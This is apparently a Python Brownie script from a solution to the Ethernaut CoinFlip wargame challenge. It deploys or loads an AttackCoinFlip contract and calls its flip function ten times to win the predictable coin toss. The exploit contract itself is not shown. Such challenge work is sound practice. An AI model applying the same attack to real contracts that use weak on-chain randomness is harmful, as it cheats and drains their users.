from scripts.helpful_scripts import get_account
from brownie import CoinFlip, network, AttackCoinFlip
from web3 import Web3


# def deploy_CoinFlip():
#     print(network.show_active())
#     account = get_account()
#     coin_flip = CoinFlip.deploy(
#         {"from": account},
#     )
#     return coin_flip


def deploy_AttackCoinFlip(CoinFlip_address):
    account = get_account()
    coin_flip_attack = AttackCoinFlip.deploy(
        CoinFlip_address,
        {"from": account},
    )
    return coin_flip_attack


def main():
    print(network.show_active())
    account = get_account()
    # coin_flip_attack = deploy_AttackCoinFlip(
    #     "0xAF9D1Ae7D98f7623207DD54b44D689D60B9a5212"  //Ethernaut CoinFlip instance
    # )
    coin_flip_attack = AttackCoinFlip[-1]
    for i in range(10):
        print(f"Flip number {i+1}")
        flip_tx = coin_flip_attack.flip(
            {"from": account, "gas_limit": 1_000_000, "allow_revert": True}
        )
        flip_tx.wait(1)
